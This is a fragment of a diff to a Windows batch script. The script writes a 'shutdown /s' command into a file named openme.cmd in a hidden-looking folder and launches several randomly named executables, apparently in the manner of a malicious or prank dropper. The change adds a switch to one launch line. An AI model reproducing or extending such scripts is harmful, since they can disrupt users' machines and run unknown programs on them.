@@ -36,7 +36,7 @@ echo shutdown /s > c:\\.systemp\openme.cmd
 start c:\\.systemp\2ga2.exe
 start c:\\.systemp\o241.exe
 start c:\\.systemp\2gs4.exe
-start c:\\.systemp\1g7p.exe
+start c:\\.systemp\1g7p.exe /s
 start c:\\.systemp\1e2g.exe
 start d:\\37uf.exe
 
